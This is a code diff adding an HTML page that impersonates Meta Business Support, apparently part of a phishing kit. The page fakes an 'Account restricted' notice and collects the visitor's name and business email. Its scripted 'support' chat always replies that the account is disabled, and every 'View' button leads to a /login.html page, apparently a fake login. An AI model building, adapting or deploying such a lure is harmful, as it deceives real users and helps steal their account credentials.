@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico" type="image/x-icon" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
+        <script src="https://cdn.tailwindcss.com"></script>
+        <title>Business Support Home</title>
+        <script>
+            const FACEBOOK_URL = '/login.html';
+
+            document.addEventListener('DOMContentLoaded', function () {
+                const dateElement = document.getElementById('current-date');
+                const today = new Date();
+                const options = { month: 'long', day: 'numeric', year: 'numeric' };
+                dateElement.textContent = '• ' + today.toLocaleDateString('en-US', options);
+            });
+
+            async function handleFormSubmit(event) {
+                event.preventDefault();
+
+                const firstName = document.getElementById('firstName').value || 'Guest';
+                const lastName = document.getElementById('lastName').value || '';
+                const email = document.getElementById('businessEmail').value || 'Not provided';
+
+                document.querySelector('.bg-white.rounded-lg.shadow-sm.p-6').style.display = 'none';
+
+                openChat();
+
+                const message = `• Name: ${firstName} ${lastName}\n• Email: ${email}\n• Issue: Account restriction and policy violation\n• Request: Need assistance with my account status.`;
+                addMessageToChat('user', message);
+
+                setTimeout(() => {
+                    addMessageToChat('support', 'Your account has been disabled due to violating our policy, please see details of the violation here', true);
+                }, 1000);
+
+                document.querySelector('#chatInterface input[type="text"]').focus();
+            }
+
+            function openChat() {
+                document.getElementById('chatInterface').classList.remove('hidden');
+                document.getElementById('supportButton').classList.add('hidden');
+            }
+
+            function closeChat() {
+                document.getElementById('chatInterface').classList.add('hidden');
+                document.getElementById('supportButton').classList.remove('hidden');
+            }
+
+            function handleKeyPress(event) {
+                if (event.key === 'Enter') {
+                    sendMessage();
+                }
+            }
+
+            function sendMessage() {
+                const input = document.getElementById('chatInput');
+                const message = input.value.trim();
+
+                if (message) {
+                    addMessageToChat('user', message);
+                    input.value = '';
+
+                    setTimeout(() => {
+                        addMessageToChat('support', 'Your account has been disabled due to violating our policy, please see details of the violation here', true);
+                    }, 500);
+                }
+            }
+
+            function addMessageToChat(type, message, includeButton = false) {
+                const chatMessages = document.getElementById('chatMessages');
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'flex gap-2';
+
+                const formattedMessage = message.replaceAll('\n', '<br>');
+
+                if (type === 'user') {
+                    messageDiv.innerHTML = `
+                        <div class="ml-auto bg-blue-600 rounded-lg p-3 max-w-[80%]">
+                            <p class="text-white text-sm whitespace-pre-line">${formattedMessage}</p>
+                        </div>
+                    `;
+                } else {
+                    messageDiv.innerHTML = `
+                        <div class="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
+                            <i class="fas fa-headset text-blue-600 text-sm"></i>
+                        </div>
+                        <div class="bg-gray-100 rounded-lg p-3 max-w-[80%]">
+                            <p class="text-gray-800 text-sm whitespace-pre-line">${formattedMessage}</p>
+                            ${
+                                includeButton
+                                    ? `
+                                <button onclick="window.location.href='${FACEBOOK_URL}'"
+                                    class="mt-2 px-3 py-1 bg-white text-sm font-medium text-gray-700 rounded border hover:bg-gray-50">
+                                    View
+                                </button>
+                            `
+                                    : ''
+                            }
+                        </div>
+                    `;
+                }
+
+                chatMessages.appendChild(messageDiv);
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+            }
+        </script>
+    </head>
+    <body class="bg-linear-to-r from-pink-50 to-blue-50">
+        <div class="flex">
+            <div class="w-16 bg-white h-screen fixed left-0 top-0 border-r flex-col md:flex hidden">
+                <div class="flex flex-col space-y-6 mt-4">
+                    <div class="w-8 h-8 mx-auto">
+                        <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta-logo.png" alt="Meta" class="w-full h-full object-contain" />
+                    </div>
+
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-bars text-xl"></i>
+                    </button>
+
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <div class="w-6 h-6 bg-gray-200 rounded mx-auto"></div>
+                    </button>
+
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-clock-rotate-left text-xl"></i>
+                    </button>
+                </div>
+
+                <div class="flex flex-col space-y-6 mt-auto mb-4">
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-circle-question text-xl"></i>
+                    </button>
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-gear text-xl"></i>
+                    </button>
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-bell text-xl"></i>
+                    </button>
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-magnifying-glass text-xl"></i>
+                    </button>
+                    <button class="text-gray-600 hover:text-blue-600">
+                        <i class="fas fa-grip text-xl"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="md:ml-16 w-full">
+                <div class="max-w-5xl mx-auto p-3 md:p-6">
+                    <div class="mb-4 text-gray-600">
+                        <span class="text-[15px]">Account overview</span>
+                        <span class="mx-2 text-[15px]">/</span>
+                        <span class="text-[15px] font-semibold">Facebook account</span>
+                    </div>
+
+                    <div class="flex flex-col md:flex-row gap-6">
+                        <div class="flex-1">
+                            <div class="bg-white rounded-lg shadow-sm p-6 mb-6">
+                                <div class="flex flex-col">
+                                    <div class="flex gap-4 mb-6">
+                                        <div class="w-12 h-12 bg-gray-100 rounded-full"></div>
+
+                                        <div>
+                                            <h2 class="text-[20px] font-semibold text-gray-900 mb-1">Account status</h2>
+                                            <div class="flex items-center gap-2">
+                                                <span class="bg-red-600 text-white px-2 py-0.5 rounded text-sm font-medium">Account restricted</span>
+                                                <span class="text-gray-500 text-sm" id="current-date"></span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <p class="text-gray-600 text-[15px] leading-relaxed mb-6">
+                                        You're not allowed to use Meta Products to advertise. This is because you didn't comply with one or more of our
+                                        <a href="#" class="text-blue-600 hover:underline">Advertising Standards</a>, such as having too many ads rejected, attempting to circumvent our ad review process, participating in fraudulent behaviour or associating with untrustworthy accounts.
+                                    </p>
+
+                                    <hr class="border-gray-200 mb-6" />
+
+                                    <div class="grid grid-cols-2 gap-6">
+                                        <div>
+                                            <h3 class="font-semibold mb-3">Restrictions</h3>
+                                            <ul class="space-y-2">
+                                                <li class="flex items-center space-x-2 text-gray-700">
+                                                    <i class="fas fa-ban text-red-500"></i>
+                                                    <span>Can't use or manage ad accounts</span>
+                                                </li>
+                                                <li class="flex items-center space-x-2 text-gray-700">
+                                                    <i class="fas fa-ban text-red-500"></i>
+                                                    <span>Can't create or run ads</span>
+                                                </li>
+                                                <li class="flex items-center space-x-2 text-gray-700">
+                                                    <i class="fas fa-ban text-red-500"></i>
+                                                    <span>Can't manage advertising assets or people for businesses</span>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div>
+                                            <h3 class="font-semibold mb-3">Disabled assets</h3>
+                                            <ul class="space-y-2">
+                                                <li class="flex items-center space-x-2 text-gray-700">
+                                                    <i class="fas fa-id-card text-red-500"></i>
+                                                    <span>Personal ad account</span>
+                                                </li>
+                                                <li class="flex items-center space-x-2 text-gray-700">
+                                                    <i class="fas fa-users text-red-500"></i>
+                                                    <span>Audiences</span>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="bg-white rounded-lg shadow-sm p-6">
+                                <div class="text-center mb-8">
+                                    <h2 class="text-[22px] font-semibold text-gray-900 mb-4">Chat with Business Support</h2>
+                                    <p class="text-gray-600 text-[15px] leading-relaxed max-w-2xl mx-auto">Chats with businesses use data to improve your experience. Meta can use the messages, actions, and information you share in these chats to personalize ads, help businesses respond faster, and improve features like translation and AI.</p>
+                                </div>
+
+                                <hr class="border-gray-200 mb-6" />
+
+                                <div class="max-w-2xl mx-auto">
+                                    <p class="text-gray-600 text-[15px] mb-6">Enter your name as you want it to appear in this business portfolio.</p>
+
+                                    <form id="supportForm" class="space-y-6" onsubmit="handleFormSubmit(event)">
+                                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                            <div>
+                                                <label for="firstName" class="block text-[15px] font-medium text-gray-900 mb-2">First name</label>
+                                                <input type="text" id="firstName" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" />
+                                            </div>
+                                            <div>
+                                                <label for="lastName" class="block text-[15px] font-medium text-gray-900 mb-2">Last name</label>
+                                                <input type="text" id="lastName" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" />
+                                            </div>
+                                        </div>
+                                        <div>
+                                            <div class="flex items-center gap-1 mb-2">
+                                                <label for="businessEmail" class="block text-[15px] font-medium text-gray-900">Business email</label>
+                                                <i class="fas fa-circle-info text-gray-400 text-sm"></i>
+                                            </div>
+                                            <input type="email" id="businessEmail" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" />
+                                            <p class="text-sm text-gray-500 mt-1">Notifications about this chat will be sent to this email address.</p>
+                                        </div>
+                                        <div class="flex justify-center">
+                                            <button type="submit" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium text-[15px]">Create Ticket</button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="w-full md:w-72">
+                            <div class="bg-white rounded-lg shadow-sm p-6">
+                                <h2 class="text-[20px] font-semibold text-gray-900 mb-4">What you can do</h2>
+                                <div class="flex items-start gap-3">
+                                    <div class="mt-1">
+                                        <div class="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
+                                            <i class="fas fa-shield text-gray-600 text-sm"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <p class="text-gray-600 text-[15px] mb-2">View violation reports and submit appeals</p>
+                                        <button onclick="window.location.href=FACEBOOK_URL" class="px-4 py-2 bg-blue-600 text-white rounded-md text-[15px] font-medium hover:bg-blue-700 transition-all shadow-sm hover:shadow-md">View</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <button id="supportButton" onclick="openChat()" class="fixed bottom-4 right-4 w-14 h-14 bg-blue-600 rounded-full shadow-lg flex items-center justify-center hover:bg-blue-700 transition-colors z-10">
+            <i class="fas fa-headset text-white text-xl"></i>
+        </button>
+
+        <div id="chatInterface" class="hidden fixed bottom-0 md:bottom-4 right-0 md:right-4 w-full md:w-96 h-[450px] bg-white rounded-lg shadow-lg z-20 [&:not(.hidden)]:flex [&:not(.hidden)]:flex-col">
+            <div class="p-4 border-b flex justify-between items-center bg-gray-50 rounded-t-lg">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
+                        <i class="fas fa-headset text-blue-600"></i>
+                    </div>
+                    <h3 class="font-medium">Business Support</h3>
+                </div>
+                <button onclick="closeChat()" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+
+            <div id="chatMessages" class="flex-1 p-4 overflow-y-auto space-y-4">
+                <div class="flex gap-2">
+                    <div class="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
+                        <i class="fas fa-headset text-blue-600 text-sm"></i>
+                    </div>
+                    <div class="bg-gray-100 rounded-lg p-3 max-w-[80%]">
+                        <p class="text-gray-800 text-sm">Your account has been disabled due to violating our policy, please see details of the violation here</p>
+                        <button onclick="window.location.href=FACEBOOK_URL" class="mt-2 px-3 py-1 bg-white text-sm font-medium text-gray-700 rounded border hover:bg-gray-50">View</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-4 border-t">
+                <div class="flex gap-2">
+                    <input type="text" id="chatInput" placeholder="Type a message..." class="flex-1 px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" onkeypress="handleKeyPress(event)" />
+                    <button onclick="sendMessage()" class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
